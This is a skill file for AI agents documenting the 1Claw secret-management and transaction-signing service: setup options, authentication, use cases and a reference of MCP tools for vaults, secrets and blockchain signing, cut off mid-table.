---
name: 1claw
version: 1.24.0
description: HSM-backed secret management for AI agents — store, retrieve, rotate, and share secrets via the 1Claw vault without exposing them in context. 1Claw is also a JWKS-published OIDC issuer for Workload Identity Federation (Anthropic WIF, GCP STS, AWS STS).
homepage: https://1claw.xyz
repository: https://github.com/1clawAI/1claw
metadata:
    {
        "openclaw":
            {
                "requires":
                    {
                        "env":
                            [
                                "ONECLAW_AGENT_API_KEY",
                            ],
                        "bins": [],
                    },
                "primaryEnv": "ONECLAW_AGENT_API_KEY",
                "install":
                    [
                        {
                            "id": "npm",
                            "kind": "node",
                            "package": "@1claw/mcp",
                            "bins": ["1claw-mcp"],
                            "label": "1Claw MCP Server",
                        },
                    ],
                "credentials": ["ONECLAW_AGENT_API_KEY"],
                "optional_credentials":
                    ["ONECLAW_AGENT_ID", "ONECLAW_VAULT_ID"],
                "permissions":
                    [
                        "vault:read",
                        "vault:write",
                        "vault:delete",
                        "secret:read",
                        "secret:write",
                        "secret:delete",
                        "policy:create",
                        "share:create",
                        "tx:sign",
                        "tx:simulate",
                    ],
            },
    }
---

# 1Claw — HSM-Backed Secret Management for AI Agents

1Claw is a cloud HSM-backed secrets manager. Agents access API keys, passwords, and credentials at runtime without them ever entering the conversation context. Secrets are encrypted with keys that never leave the HSM.

**API base URL:** `https://api.1claw.xyz`
**Shroud (TEE proxy):** `https://shroud.1claw.xyz`
**MCP endpoint:** `https://mcp.1claw.xyz/mcp`
**Dashboard:** `https://1claw.xyz`
**Docs:** `https://docs.1claw.xyz`

## Pinata / OpenClaw

**Only `ONECLAW_AGENT_API_KEY` is a secret** in the host environment (e.g. Pinata → Environment Variables). Do not instruct users to set `ONECLAW_VAULT_ID` or `ONECLAW_AGENT_ID` as required — those UUIDs are optional identifiers, not credentials; the OpenClaw plugin auto-resolves agent and default vault from the API key. Mention `ONECLAW_VAULT_ID` only when pinning a specific vault among several.

## When to use this skill

- You need an API key, password, or credential to complete a task
- You want to store a newly generated credential securely
- You need to share a secret with a user or another agent
- You need to rotate a credential after regenerating it
- You want to check what secrets are available before using one
- You need to sign or simulate an EVM transaction without exposing private keys
- You need to sign an EIP-191 personal message or EIP-712 typed data
- You want to provision multi-chain signing keys (Ethereum, Bitcoin, Solana, XRP, Cardano, Tron)
- You want to sign any of 1Claw's 31 supported XRPL types via `xrpl_tx_json` (SetRegularKey, SignerListSet, AccountSet, AccountDelete need explicit `xrpl_allowed_tx_types`)
- You want TEE-grade key isolation for transaction signing (use Shroud at `shroud.1claw.xyz`)
- Your vault uses **MPC secret storage** — DEKs split across GCP/AWS/Azure HSMs (Shamir 2-of-3) or XOR 2-of-2 client custody; provide `X-Client-Share` header when reading from client-custody vaults
- Your org uses **LLM token billing** (Stripe AI Gateway): enable in the dashboard; agent JWTs include `llm_token_billing` / `stripe_customer_id` for Shroud routing
- You need to request access to a Safe multisig treasury (agent access requests)
- You want to manage or deploy agent EVM addresses and Safe smart accounts (ERC-4337, one per chain; `POST /v1/agents/{id}/smart-accounts` to add a Safe)
- You want to propose, sign, or execute multisig treasury proposals (Safe transactions requiring threshold signatures)
- You want to set up agent delegation for treasury signing (owner mode or delegated mode with per-delegation guardrails)
- You want to generate native multi-chain treasury wallets (Ethereum, Bitcoin, Solana, XRP, Cardano, Tron) — human-only, counts toward wallet quota
- You are building a platform integration on 1Claw (register a `plt_` platform app, create bootstrap templates, provision users via OIDC or email)
- You want to approve or reject pending agent actions from the mobile app (approval queue with risk tiers)
- You are working with the 1Claw mobile companion app (Expo, React Native, passkey/biometric auth)
- You want to sign in with a passkey (WebAuthn, passwordless) or manage passkey credentials
- You want passkey-based login MFA instead of TOTP after password/social login (`require_passkey_for_mfa` via `GET/PATCH /v1/auth/settings`; complete via `POST /v1/auth/mfa/passkey/begin` + `complete`)
- You want mobile approval push alerts when `ONECLAW_EXPO_ACCESS_TOKEN` is configured (Expo push on pending approvals/HITL)
- You want to request a policy change as an agent (approval workflow, human-in-the-loop)
- You want to register webhooks for wallet, proposal, transaction, policy, or signing key events (live async delivery with retries)
- You want to check the balance of a treasury wallet or an agent's signing key address
- You want to send a gasless treasury wallet transfer (ERC-4337 UserOperation with Pimlico paymaster sponsorship)
- You need a short-lived Bankr wallet API key for LLM Gateway or agent API access (dynamic key vending via `lease_bankr_key` — preferred over static `put_secret` for Bankr)
- You want to implement passwordless login for an embedded wallet (Email OTP via `POST /v1/auth/email-otp/send` + `verify`)
- You want to add "Sign in with 1Claw" OAuth2 flow to a third-party app (OAuth2 authorization server: `/v1/oauth/authorize`, `/v1/oauth/token`, `/v1/oauth/userinfo`)
- You want to set spend policies on embedded wallets (per-app or per-user limits, allowlists, daily caps via Platform API spend policy endpoints)
- You want to monitor risk events for your org (geo-velocity, ASN drift, honeytoken triggers via `GET /v1/risk/events`)
- You want to deploy honeytoken canary secrets to detect unauthorized access (`POST /v1/risk/honeytokens`)
- You want to check the risk verdict for a principal (`GET /v1/risk/verdicts/{type}/{id}`)
- You want to enable DPoP token binding for proof-of-possession security (`dpop: true` in SDK config, `ONECLAW_DPOP=true` in MCP/CLI)
- You want an agent to make HTTP calls or API requests through pre-configured bindings without exposing credentials (Execution Intents via `POST /v1/agents/{id}/execute`)
- You want to set up execution intent bindings for an agent (HTTP, GraphQL) — human-only via `POST /v1/agents/{id}/bindings`
- You want to list or test configured execution intent bindings (`list_bindings` MCP tool, `POST .../bindings/{id}/test`)
- You want a binding credential to stay in sync with a vault secret automatically (use `credential_source: { type: "vault_ref", vault_id, path }` — live pointer, resolved at execution time)
- You want an agent to order a prepaid or gift card and pay for it with USDC via x402 without ever exposing the card number (Payment Card Vault: `order_card` / `POST /v1/agents/{id}/cards/order`)
- You want to list, refresh, void, or reveal a payment card (reveal requires human `X-Auth-Confirm` re-auth or an explicit per-card agent reveal policy)
- You want to bound how much an agent can spend ordering cards (per-agent `cards_enabled`, `card_max_order_usd`, `card_daily_limit_usd`, `card_payto_allowlist`)
- You want to store or retrieve agent memory across sessions (scratch, durable, semantic tiers via `POST/GET /v1/agents/{id}/memory`)
- You want to search agent memory using semantic similarity (`POST /v1/agents/{id}/memory/search`)
- You want to create or manage automations with AI steps, conditional logic, and variable passing (`POST /v1/automations` requires `workflow_spec` + `agent_id`; 14 step types including `ai_generate`, `memory_get/put/search`, `notify`, `approval_request`, `condition`)
- You want to browse automation presets or use the NL assist to draft workflows (`GET /v1/automations/presets`, `POST /v1/automations/assist/draft`)
- You want to deploy an agent in a managed cloud runtime (`POST /v1/runtimes`, `POST /v1/runtimes/{id}/start`)
- You want an interactive shell into a running runtime (`POST /v1/runtimes/{id}/shell/session` — human step-up auth; dashboard Terminal tab)
- You want to stream logs from a running cloud runtime (`GET /v1/runtimes/{id}/logs`)
- You want to make an agent discoverable in the public directory (`POST /v1/agents/{id}/discovery`, `POST /v1/discovery/agents`)
- You want to search or browse the agent directory (`GET /v1/discovery/agents`)
- You are building a platform integration that needs to perform CRUD on connected user resources (Platform Delegation via `X-Platform-Connection` header)
- You want to configure OAuth2 credential bindings for Execution Intents (authorization_code or client_credentials grant with automatic token refresh)
- You want to connect an agent to external services (Google, GitHub, Slack, Discord, etc.) via OAuth — human initiates flow, agent uses tokens via execution intents (`GET /v1/oauth/providers`, `POST /v1/agents/{id}/oauth/connect`, `list_oauth_providers` MCP tool)
- You want to manage OAuth app credentials for your org (`POST /v1/agents/{id}/oauth/app-credentials`)
- You want to chat with an agent via the Shroud LLM proxy with persistent conversation history (`send_chat_message`, `list_chat_conversations` MCP tools; `POST /v1/agents/{id}/chat` SSE streaming)
- You want to connect an agent to Telegram, WhatsApp, or Discord for bi-directional messaging (`create_channel`, `list_channels`, `send_channel_message` MCP tools)
- You want to send images via agent channels (DALL-E generation + Telegram `sendPhoto` delivery)
- You want to use slash commands in messaging channels (12 built-in commands: /help, /new, /model, /personality, /retry, /undo, /compress, /stop, /status, /skills, /usage, /sethome; enable via `slash_commands_enabled`)
- You want voice memo transcription in Telegram channels (Whisper API auto-transcription; enable via `voice_transcription_enabled`)
- You want cross-platform conversation continuity (`unified_conversation_id` links channels to a shared conversation context)
- You want to use the runtime tool registry to configure which tools are available to your deployed agent (12 pluggable modules: image-gen, web-search, memory-tools, file-handler, code-exec, google-tools, github-tools, slack-tools, social-tools, vault-tools, notify-tools, sub-agents)
- You want to set up sub-agent orchestration (discover agents, delegate tasks, list org agents, create sub-tasks via automations)
- You want an agent to communicate with another agent (agent-to-agent chat via `delegate_task` runtime tool or direct `POST /v1/agents/{id}/chat`)
- You want to set up human-controlled agent-to-agent delegation (`POST /v1/agents/{id}/delegations` — human-only creation; agents cannot create/modify/revoke delegations)
- You want to control which tools a delegated agent can use (tool allowlist/blocklist on `agent_delegations`)
- You want to limit delegation depth to prevent recursive chains (`max_depth` 1–10 on delegation records)
- You want to rate-limit how often an agent delegates to another (`max_daily_delegations` on delegation records)
- You want to choose delegation execution mode — `caller` (delegate uses own credentials), `target` (delegate uses target config), or `both` (per-invocation choice)
- You want to create a sub-agent with pre-configured delegation rules (dashboard wizard at `/agents/sub-agent-wizard` with 6 role presets)
- You want to check which agents your agent is authorized to delegate to (`GET /v1/agents/{id}/delegations/effective`)
- You want to implement "Sign in with 1Claw" with refresh tokens and token revocation (OAuth2 with `offline_access` scope, `POST /v1/oauth/revoke`, `DELETE /v1/oauth/consent/{app_slug}`)
- You want to manage per-key environment variables on a vault with environment scoping (`GET/POST /v1/vaults/{id}/env-vars`, `resolve_env` MCP tool)
- You want to resolve the final KEY=VALUE set for a specific environment and branch (`GET /v1/vaults/{id}/env-vars/resolve?environment=preview&git_branch=feat/x`)
- You want to manage org-level shared env vars linked to multiple vaults (`GET/POST /v1/org/env-vars`, `POST /v1/org/env-vars/{id}/link`)
- You want to create or manage named environments on a vault (production, preview, development, custom) (`GET/POST /v1/vaults/{id}/environments`)
- You want to tag an agent with an environment (`production`, `preview`, `development`, or custom) for policy scoping and env var resolution (`environment`, `environment_locked`, `env_auto_resolve` on create/update)
- You want an agent to auto-resolve vault env vars from its environment tag without passing `?environment=` (`env_auto_resolve: true` on the agent; JWT includes `environment` claim)
- You want environment-scoped access policies (`environment_in` in policy conditions — policy matches only when caller's environment is in the list)
- You want per-environment transaction guardrail overrides on an agent (`per_environment_guardrails` JSONB — e.g. stricter limits in production than preview)
- You want graduated transaction HITL (v0.54–0.55): set `tx_approval_policy` JSON so matching txs return **202** `awaiting_approval`; humans approve via `/v1/approvals/{id}/decide`
- You want EIP-712, simulation failure, or raw digest signing routed to HITL (`typed_data_policy`, `simulation_failure_policy`, `raw_signing_policy` — `deny` or `approve`)
- You want extended v0.55 guardrails: unlimited ERC-20 approval blocking, per-recipient limits, USD caps, `allow_erc4337`, `allow_eip7702`, in-flight daily budget holds
- You want v0.56 guardrail governance: Convention 6 execution shadow mode (`enforcement: log|enforce` on bindings/agents), shadow report (`GET /v1/org/guardrail-shadow-report`), revision history (`GET /v1/org/guardrail-revisions`), dry-run replay (`POST /v1/agents/{id}/guardrails/replay`)
- You want recipient address screening on agents (`address_screening_policy`: `mode` off | deny | approve; env deny list `ONECLAW_SCREENING_DENY_LIST`)
- You want wallet Human Factor Auth (HFA) on treasury send/swap/export (`GET/PUT /v1/auth/human-factor-auth`; optional `human_factor_auth` on spend policies; v0.56.2 passkey-only send/swap in dashboard and wallet-react)
- You want guardrail widening approval when relaxing binding or agent guardrails (PATCH returns **202** `pending_approval_id` until human approves `policy_change`)
- You want cumulative EVM gas caps per chain (`gas_daily_budget_native` in `per_chain_guardrails`; UTC-day sum via `agent_gas_ledger`)
- You want outbound HTTP/GraphQL idempotency on execute (`inject_idempotency_key: true` on binding guardrails — Vault injects deterministic `Idempotency-Key`)
- You want to migrate an agent EOA to a counterfactual Safe (`POST /v1/agents/{id}/accounts/migrate`; MCP `migrate_agent_to_safe`; dashboard wizard at `/agents/[agentId]/migrate-safe`)
- You want to list agent EOA/Safe accounts per chain (`GET /v1/agents/{id}/accounts`; MCP `list_agent_accounts`) or deprecate an EOA signing path (`POST .../accounts/{chain}/deprecate-eoa`; MCP `deprecate_agent_eoa`)
- You want pinned Safe module addresses for a chain (`GET /v1/safe/module-registry/{chain}`; MCP `get_safe_module_registry`) or org-wide allowance reconciliation (`POST /v1/org/safe/sync-allowances`; MCP `sync_org_safe_allowances`)
- You want org-wide emergency freeze during incident response (`POST /v1/org/freeze` / `POST /v1/org/unfreeze` — owner/admin; unfreeze requires T3 step-up)
- You want to enforce that agents only resolve env vars for their tagged environment (org setting `env.enforce_agent_environment_scope`)
- You want to browse the platform marketplace for approved apps (`GET /v1/platform/marketplace`)
- You want to check platform app statistics (`GET /v1/platform/apps/{id}/stats`)
- You want to rotate a webhook's HMAC signing secret (`POST /v1/webhooks/{id}/rotate-secret`)
- You want to submit a pre-built Solana/Bitcoin/Tron transaction for deep policy decode and signing (`raw_transaction` base64 field on sign/submit, `tron_transaction` JSON for Tron)
- You want to manage wallet access policies per-chain (`POST/GET/DELETE /v1/wallets/access-policies`)
- You want to initiate or execute credential recovery with a delay window (`POST /v1/auth/credential-recovery/requests/{id}/execute` — requires admin/owner role, 72h default delay)
- You want to reconstruct a Shamir KEK via TEE (`POST /v1/admin/shamir/reconstruct` — forwarded to Shroud; Business+ tier)

---

## Setup

### Option 0: Self-enrollment (new agents)

If you don't have credentials yet, self-enroll. The API creates a **pending** enrollment; the human **approves** in the dashboard (or via the emailed link). After approval, the API key is emailed.

**With the human's email** — Allow/Deny links are emailed, and the JSON response usually includes **`approval_url`** as a fallback if mail is delayed or lost:

```bash
# curl
curl -s -X POST https://api.1claw.xyz/v1/agents/enroll \
  -H "Content-Type: application/json" \
  -d '{"name":"my-agent","human_email":"human@example.com"}'

# TypeScript SDK (static method, no auth needed)
import { AgentsResource } from "@1claw/sdk";
await AgentsResource.enroll("https://api.1claw.xyz", {
  name: "my-agent",
  human_email: "human@example.com",
});

# CLI (no auth needed)
npx @1claw/cli agent enroll my-agent --email human@example.com
```

**Name only** (omit `human_email`) — response includes **`approval_url`**; the human opens it while signed in to approve into their org (no email required to start):

```bash
curl -s -X POST https://api.1claw.xyz/v1/agents/enroll \
  -H "Content-Type: application/json" \
  -d '{"name":"my-agent"}'

npx @1claw/cli agent enroll my-agent
```

The human receives the Agent ID + API key by email after approval. They then configure policies for your access.

### Option 1: MCP server (recommended for AI agents)

Add to your MCP client configuration. Only the API key is required — agent ID and vault are auto-discovered.

```json
{
    "mcpServers": {
        "1claw": {
            "command": "npx",
            "args": ["-y", "@1claw/mcp@0.43.4"],
            "env": {
                "ONECLAW_AGENT_API_KEY": "<agent-api-key>"
            }
        }
    }
}
```

Optional overrides: `ONECLAW_AGENT_ID` (explicit agent), `ONECLAW_VAULT_ID` (explicit vault).

**stdio refresh:** The MCP server rebuilds its Vault API client from **current** environment variables on **each tool call** (no long-lived cached client tied to startup env), so updating `ONECLAW_VAULT_ID` or keys in the client config takes effect without restarting the process.

**Hosted HTTP streaming (advanced only):** Use only when the client cannot run the stdio server above. Pass your `ocv_` API key as a Bearer token — the server exchanges it for a JWT and auto-discovers the vault. For Cursor, Claude Code, Codex, and Claude Desktop, always use stdio + `ONECLAW_AGENT_API_KEY` so `@1claw/mcp` handles token refresh automatically.

```
URL: https://mcp.1claw.xyz/mcp
Headers:
  Authorization: Bearer ocv_your_agent_api_key
```

### Option 2: TypeScript SDK

```bash
npm install @1claw/sdk
```

```ts
import { createClient } from "@1claw/sdk";

const client = createClient({
    baseUrl: "https://api.1claw.xyz",
    apiKey: process.env.ONECLAW_AGENT_API_KEY,
});
```

### Option 3: Direct REST API

Authenticate, then pass the Bearer token on every request.

```bash
# Exchange agent API key for a JWT (key-only — agent_id is auto-resolved)
RESP=$(curl -s -X POST https://api.1claw.xyz/v1/auth/agent-token \
  -H "Content-Type: application/json" \
  -d '{"api_key":"<key>"}')
TOKEN=$(echo "$RESP" | jq -r .access_token)
AGENT_ID=$(echo "$RESP" | jq -r .agent_id)

# Use the JWT
curl -H "Authorization: Bearer $TOKEN" https://api.1claw.xyz/v1/vaults
```

**Alternative:** `1ck_` API keys (personal or agent) can be used directly as Bearer tokens — no JWT exchange needed.

---

## Authentication

### Agent auth flow

1. Human registers an agent in the dashboard or via `POST /v1/agents` with an `auth_method` (`api_key` default, `mtls`, or `oidc_client_credentials`). For `api_key` agents → receives `agent_id` + `api_key` (prefix `ocv_`). For mTLS/OIDC agents → receives `agent_id` only (no API key).
2. All agents auto-receive an Ed25519 SSH keypair (public key on agent record, private key in `__agent-keys` vault).
3. API key agents exchange credentials: `POST /v1/auth/agent-token` with `{ "api_key": "<key>" }` (or `{ "agent_id": "<uuid>", "api_key": "<key>" }`) → returns `{ "access_token": "<jwt>", "expires_in": 900, "agent_id": "<uuid>", "vault_ids": ["..."] }`. Agent ID is optional — the server resolves it from the key prefix.
4. Agent uses `Authorization: Bearer <jwt>` on all subsequent requests.
5. JWT scopes derive from the agent's access policies (path patterns). If no policies exist, scopes are empty (zero access). The agent's `vault_ids` are also included in the JWT — requests to unlisted vaults are rejected.
6. Token TTL defaults to ~15 minutes (900s) but can be set per-agent via `token_ttl_seconds`. The MCP server auto-refreshes 60s before expiry.

### API key auth

Tokens starting with `1ck_` (human personal API keys), `ocv_` (agent API keys), or `plt_` (platform API keys) can be used as Bearer tokens directly on any authenticated endpoint.

All three key types support optional expiration via `api_key_expires_at`. Expired keys are rejected at authentication time with 401. Platform apps can rotate keys via `POST /v1/platform/apps/{id}/rotate-key`.

### Human password reset (email/password accounts)

- Dashboard: **Forgot password?** on the login page → email link → `/reset-password?token=…`.
- API: `POST /v1/auth/forgot-password` `{ "email" }` and `POST /v1/auth/reset-password` `{ "token", "new_password" }` (public; forgot returns a generic message).
- CLI: `1claw forgot-password`, `1claw reset-password` (use `--api-url` for self-hosted).
- **Session revocation on password change/reset:** Both `change-password` and `reset-password` invalidate all existing JWTs for the user (`revoked_before` timestamp). Any previously issued token returns 401.
- **Account lockout:** 10 consecutive failed login attempts lock the account for 15 minutes. The lockout is per-user and resets on successful login.

### Shroud & Intents hosts

- **Shroud** (`shroud.1claw.xyz`): TEE LLM proxy + transaction signing; full Intents API surface. Supported providers: OpenAI, Anthropic, Google (Gemini), Mistral, Cohere, OpenRouter, Darkbloom (E2E encrypted Apple Silicon TEE), Venice AI (zero-retention + TEE/E2EE), Bankr LLM Gateway (`X-Shroud-Provider: bankr`), Stripe AI Gateway.
- **TEE attestation:** `GET https://shroud.1claw.xyz/v1/shroud/attestation` (public) returns `attestation_level` (`none` | `identity` | `confidential` | `sev_snp`), `confidential_claims`, GCE identity JWT, and image hash for SEV-SNP verification before contract signing.
- **Intents** (`intents.1claw.xyz`): Additional ingress for signing/health checks; production smoke tests hit `/healthz`.

---

## Bankr Dynamic Key Vending

Partner-key secret engine for short-lived Bankr wallet API keys. Store the long-lived partner key (`bk_ptr_`) server-side via `BANKR_PARTNER_KEY`; Vault issues scoped, TTL-bound `bk_usr_` keys per agent through the Bankr Partner API.

**Prefer vending over static `put_secret`** for Bankr: leased keys auto-revoke on agent delete/deactivation/TTL; partner key never enters the agent vault; Shroud can resolve leases without `get_secret`.

| Property | Value |
| -------- | ----- |
| Access | **Deny-by-default** — explicit policy on `agents/{id}/bankr/*` in `__agent-keys` |
| Agent default TTL | 15 min (when `ttl_seconds` omitted) |
| Recommended TTL (agents) | 5–15 min; revoke after task |
| Max TTL | 24 hours |
| Max concurrent leases | 5 per agent |
| Default permissions | LLM Gateway enabled, read-only, agent API disabled |
| Secret output | Agent/MCP responses **omit** `api_key`; Shroud resolves leased keys |

**MCP:** `lease_bankr_key` — privileged; returns lease metadata only (no `bk_usr_` in tool output).

**CLI:** `1claw agent bankr-key lease|list|revoke <agent-id>`

**SDK:** `client.agents.leaseBankrKey()`, `.listBankrKeys()`, `.revokeBankrKey()`

**Shroud fallback order** (`X-Shroud-Provider: bankr`): (1) active lease, (2) `providers/bankr/api-key`, (3) `X-Shroud-Api-Key` header.

**Docs:** https://docs.1claw.xyz/docs/guides/bankr-key-vending

---

## MCP Tools Reference

### list_secrets

List all secrets in the vault. Returns paths, types, and versions — never values.

| Parameter | Type   | Required | Description                              |
| --------- | ------ | -------- | ---------------------------------------- |
| `prefix`  | string | no       | Path prefix to filter (e.g. `api-keys/`) |

### get_secret

Fetch the decrypted value of a secret. Use immediately before the API call that needs it. Never store the value or include it in summaries.

| Parameter | Type   | Required | Description                          |
| --------- | ------ | -------- | ------------------------------------ |
| `path`    | string | yes      | Secret path (e.g. `api-keys/stripe`) |

### put_secret

Store a new secret or update an existing one. Each call creates a new version.

| Parameter          | Type   | Required | Default   | Description                                                                                          |
| ------------------ | ------ | -------- | --------- | ---------------------------------------------------------------------------------------------------- |
| `path`             | string | yes      |           | Secret path                                                                                          |
| `value`            | string | yes      |           | The secret value                                                                                     |
| `type`             | string | no       | `api_key` | One of: `api_key`, `password`, `private_key`, `certificate`, `file`, `note`, `ssh_key`, `env_bundle` |
| `metadata`         | object | no       |           | Arbitrary JSON metadata                                                                              |
| `expires_at`       | string | no       |           | ISO 8601 expiry datetime                                                                             |
| `max_access_count` | number | no       |           | Max reads before auto-expiry (0 = unlimited)                                                         |

### delete_secret

Soft-delete a secret. Reversible by an admin.

| Parameter | Type   | Required | Description           |
| --------- | ------ | -------- | --------------------- |
| `path`    | string | yes      | Secret path to delete |

### describe_secret

Get metadata (type, version, expiry) without fetching the value. Use to check existence.

| Parameter | Type   | Required | Description |
| --------- | ------ | -------- | ----------- |
| `path`    | string | yes      | Secret path |

### rotate_and_store

Store a new value for an existing secret, creating a new version. Use after regenerating a key.

| Parameter | Type   | Required | Description      |
| --------- | ------ | -------- | ---------------- |
| `path`    | string | yes      | Secret path      |
| `value`   | string | yes      | New secret value |

### get_env_bundle

Fetch an `env_bundle` secret and parse its `KEY=VALUE` lines as JSON.

| Parameter | Type   | Required | Description                    |
| --------- | ------ | -------- | ------------------------------ |
| `path`    | string | yes      | Path to an `env_bundle` secret |

### create_vault

Create a new vault for organizing secrets.

| Parameter     | Type   | Required | Description              |
| ------------- | ------ | -------- | ------------------------ |
| `name`        | string | yes      | Vault name (1–255 chars) |
| `description` | string | no       | Short description        |

### list_vaults

List all vaults accessible to you. No parameters.

### grant_access

Grant a user or agent access to a vault path pattern.

| Parameter             | Type              | Required | Default    | Description                                    |
| --------------------- | ----------------- | -------- | ---------- | ---------------------------------------------- |
| `vault_id`            | string (UUID)     | yes      |            | Vault ID                                       |
| `principal_type`      | `user` \| `agent` | yes      |            | Who to grant access to                         |
| `principal_id`        | string (UUID)     | yes      |            | The user or agent UUID                         |
| `permissions`         | string[]          | no       | `["read"]` | `["read"]`, `["write"]`, or `["read","write"]` |
| `secret_path_pattern` | string            | no       | `**`       | Glob pattern for secret paths                  |

### share_secret

Share a secret via link, with your creator, or with a specific user/agent.

| Parameter          | Type                                                 | Required       | Description                                                              |
| ------------------ | ---------------------------------------------------- | -------------- | ------------------------------------------------------------------------ |
| `secret_id`        | string (UUID)                                        | yes            | The secret's UUID                                                        |
| `recipient_type`   | `user` \| `agent` \| `anyone_with_link` \| `creator` | yes            | `creator` shares with the human who registered this agent — no ID needed |
| `recipient_id`     | string (UUID)                                        | conditional    | Required for `user` and `agent` types                                    |
| `expires_at`       | string                                               | yes            | ISO 8601 expiry                                                          |
| `max_access_count` | number                                               | no (default 5) | Max reads (0 = unlimited)                                                |

Targeted shares (creator/user/agent) require the recipient to explicitly accept before access.

### simulate_transaction

Simulate an EVM transaction via Tenderly without signing. Returns balance changes, gas estimates, success/revert status.

| Parameter          | Type   | Required | Default               | Description                                   |
| ------------------ | ------ | -------- | --------------------- | --------------------------------------------- |
| `to`               | string | yes      |                       | Destination address (0x-prefixed)             |
| `value`            | string | yes      |                       | Value in ETH (e.g. `"0.01"`)                  |
| `chain`            | string | yes      |                       | Chain name or chain ID (see Supported Chains) |
| `data`             | string | no       |                       | Hex-encoded calldata                          |
| `signing_key_path` | string | no       | auto-resolved         | Vault path to signing key (auto-resolves per-chain key) |
| `gas_limit`        | number | no       | 21000                 | Gas limit                                     |

### submit_transaction

Submit a transaction for signing and optional broadcast. Requires `intents_api_enabled`. Works for **EVM and non-EVM** chains (Bitcoin, Solana, XRP, Cardano, Tron) — the server dispatches by chain family and auto-fetches the chain data it needs.

| Parameter                  | Type    | Required | Default               | Description                               |
| -------------------------- | ------- | -------- | --------------------- | ----------------------------------------- |
| `to`                       | string  | yes      |                       | Destination address (chain-native format) |
| `value`                    | string  | yes      |                       | Value in the chain's major unit as a decimal string (ETH / BTC / SOL / XRP / ADA / TRX) |
| `chain`                    | string  | yes      |                       | Chain name or chain ID                    |
| `data`                     | string  | no       |                       | Hex-encoded calldata (EVM)                |
| `signing_key_path`         | string  | no       | auto-resolved         | Vault path to signing key (auto-resolves per-chain key) |
| `nonce`                    | number  | no       | auto-resolved         | Transaction nonce (EVM)                   |
| `gas_price`                | string  | no       |                       | Gas price in wei (EVM legacy mode)        |
| `gas_limit`                | number  | no       | 21000                 | Gas limit (EVM)                           |
| `max_fee_per_gas`          | string  | no       |                       | EIP-1559 max fee in wei (triggers Type 2) |
| `max_priority_fee_per_gas` | string  | no       |                       | EIP-1559 priority fee in wei              |
| `simulate_first`           | boolean | no       | true                  | Run Tenderly simulation before signing (EVM-only; no-op on non-EVM) |
| `gasless`                  | boolean | no       | false                 | Sponsor gas via Pimlico paymaster (ERC-4337) |
| `destination_tag`          | number  | no       |                       | **XRP** destination tag                   |
| `memo`                     | string  | no       |                       | **Solana** Memo Program v2. XRP: accepted but not applied — use `Memos` inside `xrpl_tx_json` |
| `fee_rate_sat_per_vbyte`   | number  | no       | fetched               | **Bitcoin** fee rate override             |
| `fee_limit_sun`            | number  | no       |                       | **Tron** TRC-20 energy fee limit          |
| `token_mint`               | string  | no       |                       | **Solana (SPL) / Tron (TRC-20)** token mint/contract; omit for native transfer |
| `token_decimals`           | number  | no       | 6                     | **Solana / Tron** token decimals          |
| `ttl`                      | number  | no       |                       | **Cardano** time-to-live (absolute slot)  |
| `xrpl_tx_json`             | object  | no       |                       | **XRP** raw JSON for one of 1Claw's 31 supported types. `to`/`value` still required (use `"0"` for non-Payment). Auto-fills Account, Sequence, Fee, LastLedgerSequence, SigningPubKey, Flags, SourceTag. |

Non-EVM responses use `raw_tx` for the signed payload and a chain-native `tx_hash` (reversed-hex txid for Bitcoin, base58 signature for Solana, uppercase hex for XRP, blake2b-256 hex for Cardano, SHA-256 txID hex for Tron).

### sign_transaction

Sign a transaction without broadcasting (EVM or non-EVM). Returns `signed_tx`/`raw_tx` + `tx_hash` + `from` address. Same guardrails and chain-specific fields as `submit_transaction`.

| Parameter                  | Type    | Required | Default               | Description                               |
| -------------------------- | ------- | -------- | --------------------- | ----------------------------------------- |
| `to`                       | string  | yes      |                       | Destination address                       |
| `value`                    | string  | yes      |                       | Value in the chain's major unit as a decimal string |
| `chain`                    | string  | yes      |                       | Chain name or chain ID                    |
| `data`                     | string  | no       |                       | Hex-encoded calldata                      |
| `signing_key_path`         | string  | no       | auto-resolved         | Vault path to signing key (auto-resolves per-chain key) |
| `nonce`                    | number  | no       | auto-resolved         | Transaction nonce                         |
| `gas_price`                | string  | no       |                       | Gas price in wei (legacy mode)            |
| `gas_limit`                | number  | no       | 21000                 | Gas limit                                 |
| `max_fee_per_gas`          | string  | no       |                       | EIP-1559 max fee in wei (triggers Type 2) |
| `max_priority_fee_per_gas` | string  | no       |                       | EIP-1559 priority fee in wei              |
| `xrpl_tx_json`             | object  | no       |                       | **XRP** raw XRPL transaction JSON (same as submit_transaction) |

### list_transactions

List an agent's past transactions. Returns transaction history with status, chain, value, and timestamps.

No parameters required (uses the authenticated agent's context).

### get_transaction

Get details of a specific transaction.

| Parameter | Type   | Required | Description    |
| --------- | ------ | -------- | -------------- |
| `tx_id`   | string | yes      | Transaction ID |

### simulate_bundle

Simulate multiple EVM transactions as a sequence via Tenderly. Returns per-transaction results.

| Parameter      | Type   | Required | Description                                                         |
| -------------- | ------ | -------- | ------------------------------------------------------------------- |
| `transactions` | array  | yes      | Array of transaction objects (same fields as `simulate_transaction`) |

### inspect_content

Inspect text content through the Shroud security pipeline. Returns threat detections and policy violations without sending to an LLM.

| Parameter | Type   | Required | Description             |
| --------- | ------ | -------- | ----------------------- |
| `content` | string | yes      | Text content to inspect |

### list_signing_keys

List all multi-chain signing keys for an agent. Returns key IDs, chains, curves, public keys, and addresses.

| Parameter  | Type   | Required | Description                                |
| ---------- | ------ | -------- | ------------------------------------------ |
| `agent_id` | string | no       | Agent ID (uses authenticated agent if omitted) |

### provision_signing_key

Generate a signing key for an agent on a given blockchain. Returns the public key, on-chain address (when applicable), and key metadata. The private key is stored securely in the vault.

| Parameter  | Type   | Required | Description                                               |
| ---------- | ------ | -------- | --------------------------------------------------------- |
| `agent_id` | string | no       | Agent ID (uses authenticated agent if omitted)            |
| `chain`    | string | yes      | One of: ethereum, bitcoin, solana, xrp, cardano, tron     |

### sign_message

Sign a message using EIP-191 personal_sign. Agent must have `message_signing_enabled`.

| Parameter          | Type   | Required | Default               | Description                              |
| ------------------ | ------ | -------- | --------------------- | ---------------------------------------- |
| `agent_id`         | string | no       |                       | Agent ID (uses authenticated agent if omitted) |
| `message`          | string | yes      |                       | Hex-encoded message (0x-prefixed or raw) |
| `chain`            | string | no       | `ethereum`            | Chain name                               |
| `signing_key_path` | string | no       | auto-resolved         | Vault path to signing key (auto-resolves per-chain key) |

### lease_bankr_key

**Privileged** — deny-by-default. Requires explicit policy on `agents/{id}/bankr/*` plus `BANKR_PARTNER_KEY` on Vault. Does **not** return the `bk_usr_` key in tool output; use Shroud for LLM traffic.

| Parameter              | Type    | Required | Default | Description                                      |
